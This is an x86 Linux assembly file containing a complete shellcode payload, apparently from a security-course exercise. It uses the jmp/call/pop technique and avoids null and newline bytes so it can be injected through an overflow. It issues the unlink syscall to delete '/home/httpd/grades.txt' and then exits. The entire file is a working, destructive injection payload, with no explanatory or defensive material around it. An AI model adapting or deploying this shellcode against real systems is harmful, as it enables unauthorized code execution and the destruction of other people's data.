#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txt"
#define STRLEN	22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */

    add $5,%al  /* avoid 10 or '\n'*/
    add $5,%al  /* avoid 10 or '\n'*/
    movl %esi,%ebx  /* syscall arg 2: string pathname*/
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
